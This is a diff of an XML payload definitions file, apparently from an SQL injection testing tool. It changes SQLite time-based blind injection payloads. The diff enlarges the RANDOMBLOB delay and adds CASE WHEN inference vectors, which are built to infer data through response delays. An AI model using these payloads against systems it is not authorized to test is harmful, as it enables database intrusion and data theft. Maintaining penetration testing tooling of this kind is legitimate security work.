@@ -1383,7 +1383,7 @@ Formats:
         <clause>0</clause>
         <where>1</where>
         <request>
-            <payload>; SELECT LIKE('ABCDEFG', UPPER(HEX(RANDOMBLOB(10000000))));</payload>
+            <payload>; SELECT LIKE('ABCDEFG', UPPER(HEX(RANDOMBLOB(100000000))));</payload>
             <comment>--</comment>
         </request>
         <response>
@@ -1541,8 +1541,9 @@ Formats:
         <risk>1</risk>
         <clause>1</clause>
         <where>1</where>
+        <vector>AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (LIKE('ABCDEFG', UPPER(HEX(RANDOMBLOB(100000000))))) ELSE [RANDNUM] END)</vector>
         <request>
-            <payload>AND LIKE('ABCDEFG', UPPER(HEX(RANDOMBLOB(10000000))))</payload>
+            <payload>AND [RANDNUM]=LIKE('ABCDEFG', UPPER(HEX(RANDOMBLOB(100000000))))</payload>
         </request>
         <response>
             <time>[DELAYED]</time>
@@ -1699,8 +1700,9 @@ Formats:
         <risk>3</risk>
         <clause>1</clause>
         <where>1</where>
+        <vector>OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (LIKE('ABCDEFG', UPPER(HEX(RANDOMBLOB(100000000))))) ELSE [RANDNUM] END)</vector>
         <request>
-            <payload>OR LIKE('ABCDEFG', UPPER(HEX(RANDOMBLOB(10000000))))</payload>
+            <payload>OR [RANDNUM]=LIKE('ABCDEFG', UPPER(HEX(RANDOMBLOB(100000000))))</payload>
         </request>
         <response>
             <time>[DELAYED]</time>
